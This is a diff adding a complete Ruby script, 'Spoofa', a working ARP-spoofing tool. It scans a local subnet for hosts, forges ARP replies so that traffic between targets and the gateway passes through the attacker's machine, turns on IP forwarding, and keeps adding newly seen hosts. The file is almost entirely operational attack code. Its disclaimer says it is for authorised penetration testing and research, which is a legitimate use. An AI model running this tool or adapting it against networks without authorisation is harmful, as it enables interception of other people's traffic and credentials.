@@ -1,0 +1,374 @@
+#!/usr/bin/env ruby
+
+# SPOOFA - for ARP-spoofing local networks #
+
+# (C) 2013 VulpiArgenti (SilverFoxx)
+
+# This program is only for use during an authorised pentest, authorised network 
+#   maintenance, or for private research.
+
+# This program is free software: you can redistribute it and/or modify it under 
+#   the terms of the GNU General Public License as published by the Free 
+#   Software Foundation, either version 3 of the License, or (at your option) 
+#   any later version.
+# This program is distributed in the hope that it will be useful, but WITHOUT 
+#   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
+#   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for 
+#   more details.
+# You should have received a copy of the GNU General Public License along with 
+#   this program.  If not, see <http://www.gnu.org/licenses/>.
+
+require 'packetfu'
+require 'optparse'
+require 'ostruct'
+require 'ipaddr'
+
+#------------------------------------------------------------------------------#
+# Assorted methods
+
+def ip_check(ip)
+  true if ip =~ /^(192|10|172)((\.)(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}$/
+end
+
+def puts_verbose(text)
+  puts text if @verbose
+end
+
+def print_verbose(text)
+  print text if @verbose
+end
+
+def target_parse(target)
+  target = target.split(",")
+  @target = []                                           # Array of target ip's
+  @target, target = target.partition {|ip| ip_check(ip)} # Move single ips to @target, leaving range(s) in target. Don't you love Ruby?
+  target.each do |range|                                 # Separate range(s) into start and end addresses
+    from  = range[/\A(\w*.){3}(\w*)/]     
+    to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
+    ip_from   = IPAddr.new(from)
+    ip_to     = IPAddr.new(to)
+    (ip_from..ip_to).each { |ip| @target << ip.to_s }    # Enter each value of range into @target
+  end
+rescue
+  puts "\n!!! Invalid target #{target} !!!"
+  neat_exit
+end
+  
+def build_pkt(dest_mac, source_ip, dest_ip, source_mac = @defaults[:eth_saddr], op_code = 2)
+  @arp_pkt = PacketFu::ARPPacket.new
+  @arp_pkt.arp_opcode = op_code
+  @arp_pkt.eth_saddr = @arp_pkt.arp_saddr_mac = source_mac
+  @arp_pkt.eth_daddr = @arp_pkt.arp_daddr_mac = dest_mac
+  @arp_pkt.arp_saddr_ip = source_ip
+  @arp_pkt.arp_daddr_ip = dest_ip
+end 
+
+# Broadcast packets don't reliably work. Best to scan for, and directly target, live hosts
+def target_scanner(targets, timeout)
+  print_verbose "\nLooking for live targets..."
+  @targets_hash = {}
+  if @parallel
+    threads = []                                  # To keep track of the child processes/threads
+    @mutex = Mutex.new
+    targets.each do |ip|
+      threads << Thread.new do
+        @targets_hash[ip] = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
+        @mutex.synchronize do                     # Mutex prevents multiple threads writing to the screen at the same time
+          if @targets_hash[ip]
+            print_verbose "\n#{ip} \tmac is #{@targets_hash[ip]} "
+          else
+            print_verbose "."
+          end
+        end
+        GC.start
+      end
+      sleep 0.1     # Absolutely crucial to sleep, but you can fine-tune this value
+    end
+    threads.each { |thread| thread.join }          # Wait for all the child processes to finish
+  else              # TODO: How to DRY out?
+    targets.each do |ip|
+      @targets_hash[ip] = PacketFu::Utils::arp(ip, :timeout => timeout, :iface => @iface)
+      if @targets_hash[ip]
+        print_verbose "\n#{ip} \tmac is #{@targets_hash[ip]} "
+      else
+        print_verbose "."
+      end
+      GC.start
+    end
+  end
+  @targets_hash.delete_if { |_, v| v.nil? }
+  @targets_hash.delete(@gateway)
+end
+
+# Make arrays of packets for targets and gateway
+def make_packet_array(target_hash)
+  if @two_way
+    target_hash.each do |target, _|
+      build_pkt(@gateway_mac, target, @gateway)
+      @gateway_packets << @arp_pkt
+    end
+  end
+  target_hash.each do |target, target_mac|
+    build_pkt(target_mac, @gateway, target)
+    @target_packets << @arp_pkt
+    @mutex.synchronize do
+      @targets_hash.merge!(target_hash) # add new targets to @targets_hash, preventing duplicate new targets
+    end
+  end
+end
+
+# Continuously monitors network for new ARPs, then adds them to @new_targets.
+def arp_monitor
+  Thread.new do
+    @arp_cap = PacketFu::Capture.new(:iface => @defaults[:iface], :filter => "arp and not ether src #{@defaults[:eth_saddr]}")
+    @arp_cap.stream.each do |p|
+      @new_targets = {}   # start each loop empty
+      arp_pkt = PacketFu::Packet.parse(p)
+      ipaddr = arp_pkt.arp_saddr_ip
+      if in_scope?(ipaddr) && ipaddr != @defaults[:ip_saddr] && !@targets_hash.include?(ipaddr) && ipaddr != @gateway
+        if arp_pkt.arp_opcode == 1
+          macaddr = PacketFu::Utils::arp(ipaddr, :timeout => 6, :iface => @iface)
+          6.times { sleep 1 unless macaddr }    # FIXME: a better way of blocking
+          @new_targets[ipaddr] = macaddr
+        elsif arp_pkt.arp_opcode == 2
+          @new_targets[ipaddr] = arp_pkt.arp_saddr_mac = macaddr
+        end
+        if macaddr
+          puts_verbose("\nNew target arrived; #{ipaddr} ")
+          make_packet_array(@new_targets)       # makes additional spoof packets for any new targets
+        end
+      end
+    end
+  end
+end
+
+def in_scope?(ip)
+  @target.include?(ip)
+end
+
+def spoof
+  `echo 1 > /proc/sys/net/ipv4/ip_forward`
+  puts "\n\nSending spoofing packets to: "
+  @targets_hash.each { |ip, _| print "#{ip}; " }
+  print "and gateway #{@gateway}" if @two_way
+  print_verbose "\nPackets sent: "
+  count = 0
+  while true
+    @target_packets.each do |pkt|
+      pkt.to_w(@iface)
+      count += 1
+    end
+    if @two_way
+      @gateway_packets.each do |pkt|
+        pkt.to_w(@iface)
+        count += 1
+      end
+    end
+    GC.start   # to deal with "memory leak" (more likely a problem in calling the GC)
+    print_verbose "#{count}, "
+    sleep 4
+  end
+end
+
+def neat_exit
+  if @send_packets
+    puts "\n\nRe-ARPing the network..."
+    @send_packets = false # Stop sending spoofed packets
+    re_arp_pkts = []
+    @targets_hash.each do |target, target_mac|
+      build_pkt(target_mac, @gateway, target, @gateway_mac)
+      re_arp_pkts << @arp_pkt
+      if @two_way
+        build_pkt(@gateway_mac, target, @gateway, target_mac)
+        re_arp_pkts << @arp_pkt
+      end
+    end
+    2.times do
+      re_arp_pkts.each { |pkt| pkt.to_w(@iface) }
+      sleep 1
+    end
+    puts "...done."
+  end
+  `echo 0 > /proc/sys/net/ipv4/ip_forward`
+  puts "\nExiting Spoofa\n\n"
+  exit 0
+end
+
+trap("INT") { neat_exit }
+
+#------------------------------------------------------------------------------#
+# What mode are we running in?
+if ARGV.empty?
+  interactive = true
+else 
+  begin
+    options = OpenStruct.new
+    optparse = OptionParser.new do |opts|
+      opts.banner = "Interactive mode:\tspoofa\nCommand-line mode:\tspoofa [-hpv] [-t target(s)] [-g gateway] -i interface"
+      opts.separator ""
+      opts.separator "Specific options:"
+  
+      opts.on("-p", "--parallel", "Uses parallel/multi-threaded scanning. Very slow without it; but possibly unstable on some systems. Best run with \"-v\".") do |p|
+        options.parallel = p
+      end
+      
+      opts.on("-v", "--verbose", "Run verbosely") do |v|
+        options.verbose = v
+      end            
+  
+      opts.on("-t", "--target <target IP>", "One or more targets separated by comma (no whitespace), and/or hyphened ranges). E.g. \"-t 192.168.1.10,192.168.1.50-100\". If omitted, all live targets in the entire subnet will be spoofed. Without [-g], one-way spoofing is performed, i.e. packets *from* the target are intercepted.") do |target|
+        options.target = target
+      end
+  
+      opts.on("-g", "--gateway <gateway IP>", "Performs two-way spoofing.") do |gateway|
+        options.gateway = gateway
+      end
+  
+      opts.on("-i", "--interface <interface>", "Interface") do |interface|
+        options.interface = interface
+      end
+  
+      opts.on("-h", "--help", "You're looking at it. If it's not good enough, try the README.md at https://github.com/SilverFoxx/Spoofa") do |h|
+        puts opts
+        exit 0
+      end
+    end
+    optparse.parse! 
+    raise OptionParser::MissingArgument if options.interface.nil? 
+  rescue OptionParser::MissingArgument => e
+    puts "\n!!! Interface required !!!\n\n" if e.message =~ /argument/
+    puts optparse
+    exit 0
+  end
+end
+
+#------------------------------------------------------------------------------#
+# Let's set some defaults and variables
+
+if interactive
+  puts "Spoofa: for ARP-spoofing networks\n(C) 2013 VulpiArgenti (SilverFoxx)\n"
+  @verbose = true
+
+  @defaults = PacketFu::Utils.ifconfig(Pcap.lookupdev)
+  begin
+    @iface = @defaults[:iface] 
+    print "\nDefault interface appears to be #{@iface}.\nEnter to accept, or type an alternative: "
+    temp = gets.chomp
+    unless temp.empty?
+      @iface = temp
+      @defaults = PacketFu::Utils.ifconfig(@iface)             # Iface changed, therefore need new defaults
+    end
+  rescue ArgumentError
+    puts "!!! Invalid interface. Start again !!!"
+    sleep 1
+    retry
+  end
+
+  until ip_check(@gateway) do
+    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ }  # Find gateway by parsing netstat
+    @gateway = net.first.split[1] 
+    if ip_check(@gateway)
+      print "Gateway appears to be #{@gateway}.\nEnter to accept, or type an alternative IP: "
+    else
+      print "Unable to determine gateway. Please enter IP: "
+    end
+    temp = gets.chomp
+    @gateway = temp unless temp.empty?
+    unless ip_check(@gateway)
+      puts "!!! Invalid IP address. Try again !!!"
+      sleep 1
+    end 
+  end
+
+  var = false
+  until var 
+    print "Spoof target only (1-way), or router as well (2-way)? (1/2): "
+    var = gets.chomp
+    if  var == "2"
+      @two_way = true
+    elsif var == "1"
+      @two_way = false
+    else
+      var = false
+      puts "Must enter \"1\" or \"2\"."
+      sleep 1
+    end
+  end
+  
+  var = false
+  until var 
+    print "Use multi-threading to scan the subnet? (y/n): "
+    var = gets.chomp.downcase
+    if  var == "y"
+      @parallel = true
+    elsif var == "n"
+      @parallel = false
+    else
+      var = false
+      puts "Must enter \"y\" or \"n\"."
+      sleep 1
+    end
+  end
+  
+  print "Enter target IP(s), separated by comma, or as a range. Enter blank to target entire subnet: "
+  target = gets.chomp
+
+# Command-line mode 
+else  
+  @verbose  = options.verbose
+  @iface    = options.interface
+  target    = options.target
+  @gateway  = options.gateway
+  @parallel = options.parallel
+  @defaults = PacketFu::Utils.ifconfig(@iface)
+
+  @two_way = true
+  unless @gateway
+    @two_way = false
+    net = (`netstat -nr`).split(/\n/).select {|n| n =~ /UG/ } # Find gateway by parsing netstat
+    @gateway = net.first.split[1]
+  end 
+  unless ip_check(@gateway)
+    print "Unable to verify gateway address. Try again with 2-way spoofing, or interactive mode."
+    sleep 2
+    exit 0
+  end
+end
+broadcast = true if target.nil? || target == ""
+target = "#{(@defaults[:ip4_obj]).to_s}-255" if broadcast # Network ip, range 0-255
+
+if @two_way
+  var2 = "two-way with gateway #{@gateway}."
+else
+  var2 = "one-way."
+end
+if broadcast
+  var3 = "entire network"
+else
+  var3 = target
+end 
+puts "\nSpoofing #{var3} on #{@iface}, #{var2}"
+
+@gateway_packets = []  
+@target_packets  = []
+
+#------------------------------------------------------------------------------#
+# Run the script
+
+puts_verbose("\nLooking for gateway...")
+@gateway_mac = PacketFu::Utils::arp(@gateway, :timeout => 6, :iface => @iface)
+6.times { sleep 1 unless @gateway_mac } # FIXME: a better way of waiting for gateway response
+if @gateway_mac
+  puts_verbose "#{@gateway} \tmac is #{@gateway_mac} (Gateway)"
+else
+  puts "Unable to determine gateway mac."
+  sleep 1
+  neat_exit
+end
+
+target_parse(target)
+target_scanner(@target, 4)
+make_packet_array(@targets_hash)
+arp_monitor
+@send_packets = true
+spoof while @send_packets
